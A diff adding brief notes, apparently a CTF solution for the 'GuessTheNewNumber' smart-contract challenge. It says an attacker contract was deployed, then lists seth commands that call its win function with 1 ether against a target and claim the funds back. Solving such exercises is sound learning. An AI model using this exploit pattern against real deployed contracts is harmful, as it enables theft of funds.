@@ -1,0 +1,7 @@
+# Written up contract "GuessTheNewNumber" and deploy
+
+# Call the win function
+> seth send 0xf693bdE0348a122b819E730B7ef07be1656A54fb "win(address)()" 0xbEC1ED9651405cFeB6fd45c659e5eB4643E58a07 --value 1000000000000000000
+
+# Claim the funds from the contract back
+> seth send 0xdafE113A459339713fd484859371c725244c28a5 "claimFunds()()"
